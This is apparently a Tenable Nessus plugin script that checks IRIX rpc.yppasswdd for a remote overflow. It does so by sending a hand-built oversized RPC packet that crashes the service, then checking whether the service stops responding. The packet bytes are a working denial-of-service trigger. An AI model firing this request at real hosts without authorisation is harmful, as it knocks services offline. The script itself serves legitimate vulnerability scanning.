#
# (C) Tenable Network Security, Inc.
#

#
# This is *NOT* the issue described in CVE-2002-0357, which happens
# to be a logic error for which details have not been leaked at all.
#


include("compat.inc");

if(description)
{
 script_id(11021);
 script_version ("$Revision: 1.18 $");
 script_xref(name:"OSVDB", value:"9727");

 script_name(english:"IRIX rpc.yppasswdd Unspecified Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote RPC service #100009 (yppasswdd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

Note: This issue is different than the one described in 
CVE-2002-0357 / SGI advisory #20020601-01-P." );
 script_set_attribute(attribute:"solution", value:
"Disable this service if you don't use it.");
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C" );

script_end_attributes();
 
 script_summary(english: "heap overflow through rpc.passwd");
 script_category(ACT_DENIAL); 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "RPC");
 script_dependencies("rpc_portmap.nasl", "yppasswdd.nasl");
 script_require_keys("rpc/portmap", "Settings/ParanoidReport");
 script_exclude_keys("rpc/yppasswd/sun_overflow");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) exit(0);

n = get_kb_item("rpc/yppasswd/sun_overflow");
if(n)exit(0);


function ping(len)
{
 local_var crp, len_hi, len_lo, r, req;
 global_var soc;

 crp = crap(len-4);
    
    len_hi = len / 256;
    len_lo = len % 256;
    
    req = raw_string(0x56, 0x6C, 0x9F, 0x6B, 
    		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01,
		     0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, len_hi, len_lo, 0x80, 0x1C, 0x40, 0x11
		     ) + crp + raw_string(0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00);
     send(socket:soc, data:req);
     r = recv(socket:soc, length:28);
     if(strlen(r) > 1)return(1);
     else return(0);
}

port = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
if(port)
{
  if(get_port_state(port))
  {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    p1 = ping(len:80);
    if(p1)
    {
     p2 = ping(len:4000);
     if(!p2)
     {
      p3 = ping(len:80);
      if(!p3)security_hole(port:port, protocol:"udp");
     }
     }
   }
  }
}
